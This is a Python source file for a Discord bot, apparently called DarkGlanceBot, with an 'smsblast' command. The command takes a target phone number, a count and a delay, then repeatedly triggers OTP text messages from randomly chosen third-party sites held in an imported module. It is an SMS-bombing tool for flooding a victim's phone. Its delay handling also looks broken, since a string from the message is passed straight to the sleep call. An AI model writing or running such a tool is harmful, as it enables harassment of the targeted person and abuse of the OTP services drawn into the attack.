import discord
from discord.ext import commands
from random import choice
import otp_sites
import asyncio

from sys import path
from os import getcwd
path.append(getcwd().rstrip('sms_blaster'))
from logger.logger import logger
from darkglance import check_auth,discord_

client = commands.Bot(command_prefix = '.')

@client.event
async def on_ready():
    print("\nServer has been started")
    print("DarkGlanceBot is ready blast sms")

@client.command(aliases = ['smsb'])
async def smsblast(ctx):#.smsblast 9566782699 2 5
    logger.discord_input_sms_blast(ctx, getcwd().rstrip('sms_blaster') + '\logger')

    if not await check_auth(ctx, ('owner', 'admin')):
        return

    command = ctx.message.content.split()

    try:
        ph_num = command[1]
    except:
        embed = discord.Embed(title = 'Phone number not entered or Invalid input', color = 0xffffff)
        await ctx.send(embed = embed)
        return

    try:
        count = command[2]
    except:
        embed = discord.Embed(title = 'Count not entered or Invalid input', color = 0xffffff)
        await ctx.send(embed = embed)
        return

    try:
        delay = command[3]
    except:
        delay = 10
    

    for count_ in range(int(count)):
        choice(otp_sites.sites)(ph_num)
        await asyncio.sleep(delay)


############################
##------------------------##
client.run(discord_.token)##
##------------------------##
############################

    
